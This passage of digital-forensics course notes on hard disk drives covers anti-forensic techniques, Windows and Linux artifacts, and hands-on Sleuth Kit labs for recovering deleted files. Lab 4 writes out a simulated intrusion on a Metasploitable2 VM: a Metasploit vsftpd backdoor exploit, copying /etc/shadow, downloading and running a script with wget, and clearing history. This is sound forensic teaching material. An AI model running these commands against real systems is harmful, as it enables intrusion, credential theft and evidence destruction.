   • Sent folder in email client (even if emptied, OST/PST may retain)
   • Email server logs (if accessible)
   • Network traffic capture

4. Compression before exfil (attacker ZIP's data first):
   Evidence:
   • ZIP file creation in $USNJrnl even if ZIP later deleted
   • Prefetch of compression tool (7z.exe, winrar.exe)
   • Temporary file artifacts
```

### HDD Firmware Attack (Advanced/APT Level)

```
EQUATION GROUP HDD FIRMWARE ATTACK (NSA-linked, discovered 2015):

Method:
  Malware flashes reprogrammed firmware to HDD controller
  Firmware modification creates hidden storage area
  (HPA — Host Protected Area, DCO — Device Configuration Overlay)
  These areas invisible to OS, invisible to normal forensic tools

Capabilities:
  → Survives OS reinstall (firmware is in HDD chip, not OS)
  → Survives full format (same reason)
  → Survives repartitioning
  → Hidden area stores persistent malware

Detection (extremely difficult):
  → Compare drive firmware version/hash to manufacturer's official
  → Use ATA commands to query HPA/DCO areas:
    hdparm -N /dev/sda   # Check HPA
    hdparm --dco-identify /dev/sda  # Check DCO

Targeted drives: Seagate, WD, Toshiba, IBM, Maxtor, Samsung
Victim scope: Banks, governments, telecoms in 30+ countries
```

---

## 12. Anti-Forensic Techniques on HDD

| Technique                                       | How It Works                                            | Forensic Counter                                                                              |
| ----------------------------------------------- | ------------------------------------------------------- | --------------------------------------------------------------------------------------------- |
| **Secure Delete (single pass)**                 | Overwrite file with zeros/random                        | Some magnetic residue may remain; check HDD history for access patterns                       |
| **Secure Delete (multi-pass, Gutmann 35-pass)** | 35 overwrite patterns                                   | Effectively impossible to recover on modern drives (density too high)                         |
| **Full Format**                                 | Writes zeros to all sectors (Windows "full format")     | Very difficult recovery; some file system metadata in image header may hint at prior contents |
| **Quick Format**                                | Clears file system, marks all space as free             | Data FULLY recoverable — quick format does almost nothing to data                             |
| **Disk Encryption (VeraCrypt/BitLocker)**       | Entire drive encrypted                                  | Without key: unreadable. Key may be in RAM. Metadata (file names in some setups) may leak     |
| **Overwriting with random data (DBAN)**         | Darik's Boot and Nuke — overwrites all sectors          | Data destroyed. DBAN run is itself evidence (wipe program artifacts on OS partition)          |
| **Physical Destruction**                        | Shredding, degaussing, incineration                     | Forensic lab can sometimes recover from partially damaged platters                            |
| **Degaussing**                                  | Strong magnet destroys magnetic domains                 | Drive fails completely; however, degausser itself must be powerful enough (cheap ones fail)   |
| **Hidden Partition**                            | Data in unpartitioned space between or after partitions | Bit-stream image captures all space; Autopsy shows unpartitioned regions                      |
| **Steganography in files**                      | Hide data inside images/audio stored on drive           | Stegdetect, statistical analysis, file size anomalies                                         |
| **Timestomping**                                | Modify file timestamps to mislead timeline              | $STANDARD_INFORMATION vs $FILE_NAME timestamps often differ; $USNJrnl has original times      |

### Detecting Anti-Forensics

```bash
# 1. Detect Quick Format vs Full Format vs Secure Wipe:
# Quick format: file system header present, data in "free" space
# Full format: zeros in all space
# Secure wipe: high entropy (random data) in all space

# Check entropy of disk image sections:
binwalk -E /evidence/case001.img
# Flat low entropy = zeros (full format, mostly empty)
# Flat HIGH entropy = encrypted or random data (secure wipe or encryption)
# Mixed entropy = normal drive (some data, some free space)

# 2. Detect timestamp manipulation:
# NTFS stores timestamps in TWO places:
# $STANDARD_INFORMATION: user-visible, CAN be modified
# $FILE_NAME: created when file created, cannot be easily changed
istat /evidence/case001.img <inode_number>
# Compare SI timestamps vs FN timestamps
# If SI timestamps are older than FN timestamps: TIMESTOMPED!

# 3. Check for HPA (Hidden Protected Area):
hdparm -N /dev/sdb        # Shows user capacity vs native max address
# If these differ: HPA exists (hidden area at end of drive!)
# Disable HPA for complete imaging:
hdparm -N p [native_max_sectors] /dev/sdb   # WARNING: permanent change

# 4. Find evidence of wiping tools:
# Windows Prefetch: look for ERASER.EXE, DBAN entries
# Linux history: look for dd, shred, wipe commands
strings /evidence/case001.img | grep -i "shred\|dban\|eraser\|ccleaner"

# 5. Detect VeraCrypt / BitLocker containers:
# Look for files with very high entropy and no file signature:
binwalk /evidence/case001.img | grep "High entropy"
# Or: look for files that file command can't identify
file /mnt/evidence/*  | grep "data"   # "data" = unknown = possibly encrypted
```

---

## 13. HDD Forensic Artifacts — What Each Reveals

### Windows HDD Artifacts Master Table

| Artifact                                 | Location                                              | What It Reveals                                            |
| ---------------------------------------- | ----------------------------------------------------- | ---------------------------------------------------------- |
| **$MFT**                                 | C:\$MFT                                               | Every file ever on the drive (deleted entries persist)     |
| **$USNJrnl**                             | C:\$Extend\$UsnJrnl                                   | History of all file system changes with timestamps         |
| **$LogFile**                             | C:\$LogFile                                           | Recent NTFS transactions                                   |
| **Prefetch files**                       | C:\Windows\Prefetch\*.pf                              | Every program executed, last 8 run times, files accessed   |
| **Registry hives**                       | C:\Windows\System32\config\*                          | Software installed, USB devices connected, user activity   |
| **Event logs**                           | C:\Windows\System32\winevt\logs\*.evtx                | Login events, service starts, security events              |
| **Recycle Bin**                          | C:\$Recycle.Bin\                                      | Files deleted via Explorer (path + deletion time)          |
| **LNK files**                            | C:\Users\*\AppData\Roaming\Microsoft\Windows\Recent\  | Recently accessed files (even from USB or network)         |
| **Shellbags**                            | Registry (NTUSER.DAT)                                 | Folders browsed in Windows Explorer (including deleted!)   |
| **Browser history**                      | C:\Users\*\AppData\Local\[browser]\User Data\         | Websites visited, downloads, searches                      |
| **Thumbcache.db**                        | C:\Users\*\AppData\Local\Microsoft\Windows\Explorer\  | Thumbnails of viewed images (survives file deletion)       |
| **Pagefile.sys**                         | C:\pagefile.sys                                       | Virtual memory — may contain passwords, documents, keys    |
| **Hiberfil.sys**                         | C:\hiberfil.sys                                       | RAM snapshot from hibernation — treat like RAM dump!       |
| **VSS (Shadow Copies)**                  | System Volume Information                             | Previous file versions (target for ransomware deletion)    |
| **Amcache.hve**                          | C:\Windows\AppCompat\Programs\Amcache.hve             | SHA1 hash of every executed program — great for malware ID |
| **SRUM (System Resource Usage Monitor)** | C:\Windows\System32\sru\SRUDB.dat                     | Network usage per app, energy usage, push notifications    |

### Linux HDD Artifacts

| Artifact              | Location                           | What It Reveals                              |
| --------------------- | ---------------------------------- | -------------------------------------------- |
| **bash_history**      | ~/.bash_history                    | Commands run by user                         |
| **auth.log / secure** | /var/log/auth.log                  | Login attempts, sudo usage, SSH              |
| **syslog**            | /var/log/syslog                    | General system events                        |
| **cron logs**         | /var/log/cron.log                  | Scheduled task execution                     |
| **Apache/Nginx logs** | /var/log/apache2/, /var/log/nginx/ | Web server access, attacks                   |
| **Recently used**     | ~/.local/share/recently-used.xbel  | Files recently opened                        |
| **/proc artifacts**   | Captured during live investigation | Running processes, network connections       |
| **Journal (systemd)** | /var/log/journal/                  | Comprehensive system logging                 |
| **tmp artifacts**     | /tmp/, /var/tmp/                   | Temporary files (cleared on reboot for /tmp) |
| **Inode table**       | File system metadata               | File creation/modification/access times      |

---

## 14. Practical Labs

### Lab 1: Explore HDD Structure with Sleuth Kit

```bash
# Install The Sleuth Kit:
sudo apt install sleuthkit -y

# Create a test disk image to work with (or use your forensic image):
dd if=/dev/zero of=/tmp/test_disk.img bs=1M count=100
mkfs.ext4 /tmp/test_disk.img
mkdir /mnt/testdisk
mount -o loop /tmp/test_disk.img /mnt/testdisk

# Create test files:
echo "Important evidence" > /mnt/testdisk/evidence.txt
echo "Secret password: Admin@123" > /mnt/testdisk/secret.txt
mkdir /mnt/testdisk/docs
cp /etc/passwd /mnt/testdisk/docs/

# Now "delete" the evidence:
rm /mnt/testdisk/evidence.txt
rm /mnt/testdisk/secret.txt
umount /mnt/testdisk

# FORENSIC INVESTIGATION:
# 1. Examine filesystem information:
fsstat /tmp/test_disk.img
# Shows: filesystem type, volume name, sector size, cluster size,
#        total sectors, free sectors

# 2. List all files including deleted (marked with *):
fls -r /tmp/test_disk.img
# Output:
# d/d 11: lost+found
# d/d 12: docs
# r/r 13: docs/passwd
# r/r * 14: evidence.txt    ← DELETED but visible!
# r/r * 15: secret.txt      ← DELETED but visible!

# 3. Get details about deleted inode:
istat /tmp/test_disk.img 14
# Shows: file size, timestamps, data block addresses

# 4. RECOVER the deleted file content:
icat /tmp/test_disk.img 14
# Output: "Important evidence"  ← Fully recovered!

icat /tmp/test_disk.img 15
# Output: "Secret password: Admin@123"  ← Fully recovered!

# 5. Timeline of all file activity:
mactime -b <(fls -r -m "/" /tmp/test_disk.img) > /tmp/timeline.txt
sort /tmp/timeline.txt | head -30
# Shows: what was created, accessed, modified, deleted and WHEN
```

### Lab 2: File Carving — Recover Without Metadata

```bash
# Simulate: attacker does "rm" AND writes new data to try to overwrite
# (but not enough new data to overwrite everything)

# Setup test disk with evidence:
dd if=/dev/zero of=/tmp/carve_test.img bs=1M count=50
mkfs.ext4 /tmp/carve_test.img
mount -o loop /tmp/carve_test.img /mnt/testdisk

# Create a "secret" JPG (we'll use a text file to simulate):
echo "ATTACKER_SECRET_DATA_DO_NOT_FIND" > /mnt/testdisk/secret.jpg
# Also add a real-ish binary with file header:
printf '\xff\xd8\xff\xe0SECRET_IMAGE_CONTENT_HIDDEN\xff\xd9' > /mnt/testdisk/photo.jpg

# "Securely" delete (rm + some overwriting):
rm /mnt/testdisk/secret.jpg
rm /mnt/testdisk/photo.jpg
# Write some junk to partially overwrite:
dd if=/dev/urandom of=/mnt/testdisk/noise.dat bs=1K count=10
umount /mnt/testdisk

# CARVE for deleted files:
foremost -t jpg -i /tmp/carve_test.img -o /tmp/carved/
ls /tmp/carved/jpg/     # Found JPGs!
cat /tmp/carved/jpg/00000000.jpg    # Our "photo.jpg" content recovered

# More comprehensive carving:
photorec /tmp/carve_test.img
# Interactive — select file types → output directory
# Recovers many file types even without directory entries
```

### Lab 3: Analyze Windows Artifacts from a Disk Image

```bash
# If you have a Windows disk image (or Windows VM):

# 1. Extract Windows Prefetch files (program execution history):
# Mount image in Autopsy → Navigate to Windows/Prefetch/
# Or: extract with Python

# 2. Parse Windows Event Logs:
pip install python-evtx
python3 -c "
from evtx import PyEvtxParser
parser = PyEvtxParser('/mnt/evidence/Windows/System32/winevt/Logs/Security.evtx')
for record in parser.records():
    if '4624' in record['data'] or '4625' in record['data']:  # Logon events
        print(record['timestamp'], record['data'][:200])
" 2>/dev/null | head -40

# 3. Extract $USNJrnl (file change history):
# Install MFT parser:
pip install mft-parser  # or use analyzeMFT

# Parse $MFT:
python3 analyzeMFT.py -f /evidence/\$MFT -o /tmp/mft_output.csv

# Search for deleted executables in MFT:
grep -i "\.exe" /tmp/mft_output.csv | grep "DELETED"

# 4. Registry analysis — find USB devices connected:
# Using RegRipper:
regripper -r /evidence/Windows/System32/config/SYSTEM \
          -p usbstor > /tmp/usb_history.txt
cat /tmp/usb_history.txt
# Shows: every USB storage device ever connected, with timestamps!
```

### Lab 4: Attack Your Own System → Investigate HDD Artifacts

```bash
# PHASE 1: SIMULATE ATTACKER ACTIONS on your test VM (Metasploitable2 or own Linux)

# Get shell on Metasploitable2:
msfconsole -q
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.100.x
run

# In the shell — do things an attacker would do:
cat /etc/shadow > /tmp/shadow_copy.txt     # Steal password hashes
wget http://192.168.100.1/fake_malware.sh  # Simulate download
chmod +x /tmp/fake_malware.sh
/tmp/fake_malware.sh                       # Execute
rm /tmp/shadow_copy.txt                    # Try to hide evidence
rm /tmp/fake_malware.sh                    # Try to cover tracks
history -c                                 # Clear history

exit   # Leave the shell

# PHASE 2: FORENSIC INVESTIGATION
# Capture disk image of Metasploitable2:
# (From Kali, you'd typically pull the VM disk file directly)
# Or: SSH into Metasploitable2 and create image:
ssh msfadmin@192.168.100.x
sudo dd if=/dev/sda of=/tmp/disk.img bs=4M status=progress
# Transfer to Kali:
scp msfadmin@192.168.100.x:/tmp/disk.img /evidence/metasploitable_disk.img

# INVESTIGATE:
# 1. Find deleted files (shadow_copy.txt and fake_malware.sh):
fls -r /evidence/metasploitable_disk.img | grep -E "shadow|malware"

# 2. Recover deleted files:
icat /evidence/metasploitable_disk.img <inode> > /recovered/shadow_copy.txt
cat /recovered/shadow_copy.txt   # Recovered the stolen shadow file!

# 3. Check bash history (was it REALLY cleared?):
# History in RAM captured differently; on disk:
# ~/.bash_history is cleared but... check /proc/*/fd/ if system still running
# Or check the inode of .bash_history — file still there?
fls -r /evidence/metasploitable_disk.img | grep "bash_history"

# 4. Check /var/log for attack traces:
# Mount image:
mkdir /mnt/meta_disk
mount -o ro,loop /evidence/metasploitable_disk.img /mnt/meta_disk

grep -i "vsftpd\|backdoor\|6200" /mnt/meta_disk/var/log/syslog
grep "Failed\|Accepted" /mnt/meta_disk/var/log/auth.log

# 5. Find wget download evidence:
grep "wget\|curl" /mnt/meta_disk/var/log/syslog
# Even if history was cleared, system log may show wget execution

umount /mnt/meta_disk
```

### Lab 5: Slack Space Analysis

```bash
# Create a file that demonstrates slack space:
dd if=/dev/zero of=/tmp/slack_test.img bs=1M count=10
mkfs.ext4 -b 4096 /tmp/slack_test.img    # 4KB block size (= cluster size)
mount -o loop /tmp/slack_test.img /mnt/testdisk

# Write old data to a block:
printf "OLD_SECRET_PASSWORD_DO_NOT_FIND_ME_123456" > /mnt/testdisk/old_file.txt
sync

# Now overwrite with SMALLER file (old data remains in slack):
echo "NEW" > /mnt/testdisk/old_file.txt   # Only 4 bytes, cluster = 4096 bytes
sync

umount /mnt/testdisk

# Read the raw block — slack space reveals old content:
# Find block number of the file:
fls /tmp/slack_test.img | grep old_file
# Output: r/r 13: old_file.txt

istat /tmp/slack_test.img 13
# Find data block number in output, e.g., block 20

# Read the raw block:
blkcat /tmp/slack_test.img 20 | strings
# You'll see "NEW" AND "OLD_SECRET_PASSWORD..." in the slack space!
```

---

## 15. Physical Evidence Handling for HDDs

### Transport and Storage Rules

```
DO:
  ✓ Place in antistatic bag (prevents static discharge to magnetic platters)
  ✓ Place padded, shock-absorbing case around antistatic bag
  ✓ Keep away from magnets (speakers, MRI machines, security screening?)
  ✓ Keep away from extreme temperatures (store at 20-25°C)
  ✓ Label with case number BEFORE touching
  ✓ Photograph drive (serial number, model, condition) before handling
  ✓ Handle by edges — minimize finger contact on PCB
  ✓ Transport in horizontal orientation if possible

DON'T:
  ✗ Power on a clicking drive (seek for head) — clicking = head crash, worse damage
  ✗ Drop or knock (moving parts extremely sensitive to shock)
  ✗ Expose to magnetic fields (degausses data!)
  ✗ Touch platters if case is opened (oil from fingers = data loss)
  ✗ Freeze the drive (myth — effective for older drives, can crack modern drives)
  ✗ Open in non-clean room environment (dust particle = head crash)
  ✗ Connect without write blocker (ever!)
```

### When Drive Makes Clicking Noise

```
Clicking HDD = HEAD CRASH (read/write head touching platter)

Immediate action:
  1. Power OFF immediately (every click = more platter surface damage)
  2. Do NOT attempt recovery yourself
  3. Contact professional data recovery service
  4. Document the symptom in chain of custody notes

What NOT to do:
  ✗ Freeze the drive (myth — may crack platters)
  ✗ Hit/tap the drive (may damage platters further)
  ✗ Open the drive outside a cleanroom (instant additional damage)
  ✗ Keep trying to boot (each attempt = more head crash damage)
```

---

## 16. Quick Reference Tables

### HDD Component → Forensic Relevance

| Component                 | What It Stores                 | Forensic Importance                          |
| ------------------------- | ------------------------------ | -------------------------------------------- |
| **Platter**               | All data (magnetic domains)    | PRIMARY evidence source                      |
| **Read/Write Head**       | Nothing (functional component) | Head crash → data loss → recovery service    |
| **PCB**                   | Firmware, drive calibration    | Firmware malware, PCB swap for recovery      |
| **Cache (DRAM on PCB)**   | Recently read/written data     | Lost on power off; not forensically relevant |
| **Spindle Motor**         | Nothing (mechanical)           | RPM determines imaging speed                 |
| **Sectors**               | 512/4096 bytes of data         | Smallest recoverable unit                    |
| **Slack Space**           | Old file fragments             | Hidden by OS but readable in forensics       |
| **Unallocated Space**     | "Deleted" files                | Most valuable recovery area                  |
| **File System MFT/inode** | File metadata                  | Persists after file deletion                 |

### Attack → HDD Evidence Left Behind

| Attack                       | HDD Evidence                                                                           |
| ---------------------------- | -------------------------------------------------------------------------------------- |
| Ransomware                   | Encrypted files, ransom notes, vssadmin prefetch, $USNJrnl showing bulk rename/encrypt |
| Data theft via USB           | USB registry entries, LNK files, recently opened showing USB path, $USNJrnl            |
| Malware installation         | Prefetch of malware, Amcache hash, $USNJrnl creation of malware file                   |
| Attacker's tool usage        | Prefetch of attack tools (nmap.exe, mimikatz.exe, sqlmap.exe)                          |
| Web-based attack             | Browser history, downloaded files, LNK in recent files                                 |
| File deletion (cover tracks) | $USNJrnl records deletion, slack space of adjacent files, file carving                 |
| Account compromise           | Event log login events (4624/4625), registry last login times                          |
| Lateral movement             | Remote desktop artifacts, NTLM auth in event logs, network drive LNKs                  |
| Persistence (scheduled task) | Task files in C:\Windows\System32\Tasks\, $USNJrnl creation                            |

### Key Sector/Size Reference

| Unit                       | Size        | Contains                             |
| -------------------------- | ----------- | ------------------------------------ |
| Sector (traditional)       | 512 bytes   | Smallest HDD physical unit           |
| Sector (modern/AF)         | 4,096 bytes | Advanced Format drives               |
| Cluster (typical)          | 4,096 bytes | Smallest file system allocation unit |
| Block (Linux ext4)         | 4,096 bytes | Equivalent to cluster on ext4        |
| MFT Entry (NTFS)           | 1,024 bytes | One file's metadata record           |
| Page (Windows virtual mem) | 4,096 bytes | Pagefile.sys unit                    |

---

_Hard Disk Drive — Digital Forensics Notes | Cybersecurity Department_
_Series: Architecture → Registers → Forensics P1 → P2 → HDD (this)_
_Lab environment: Kali Linux, Sleuth Kit, Autopsy, Foremost, PhotoRec_
_All labs conducted on authorized systems and personal images only_
